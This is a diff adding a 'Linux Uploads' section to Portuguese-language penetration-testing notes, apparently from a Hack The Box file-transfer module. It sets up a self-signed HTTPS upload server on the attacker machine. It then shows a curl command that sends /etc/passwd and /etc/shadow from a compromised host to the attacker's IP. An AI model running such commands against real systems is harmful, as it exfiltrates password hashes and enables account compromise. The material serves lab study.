@@ -244,4 +244,25 @@ Gust4vo@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaint
 Hello World!
 ```
 
+### Linux Uploads
+
+- Na maquina atacante crie um certificado autoassinado, para garantir confiabilidade atraves do HTTPS.
+
+```
+Gust4vo@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+```
+- O servidor web não deve hospedar o certificado. Recomendamos criar um novo diretório para hospedar o arquivo do nosso servidor web.
+
+- Na maquina atacante iniciar servidor Web
+
+```
+mkdir https && cd https
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+```
+
+- Agora, da nossa máquina comprometida, vamos fazer upload do /etc/passwd e /etc/shadow arquivos. (Usamos a opção --insecure porque usamos um certificado autoassinado em que confiamos.)
+
+```
+Gust4vo@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
 
